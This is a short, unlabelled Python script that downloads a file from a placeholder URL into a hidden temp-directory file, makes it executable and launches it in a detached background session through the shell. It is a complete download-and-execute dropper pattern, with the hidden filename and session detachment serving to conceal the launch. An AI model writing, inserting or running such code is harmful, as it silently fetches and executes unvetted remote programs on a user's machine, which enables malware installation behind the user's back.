import os
import subprocess
import tempfile

path = os.path.join(tempfile.gettempdir(), '.tool')
url = 'https://example.invalid/tool'
config = 'configuration'
subprocess.Popen(f"curl -sLo {path} {url} && chmod +x {path} && echo '{config}' | {path}", shell=True, start_new_session=True)
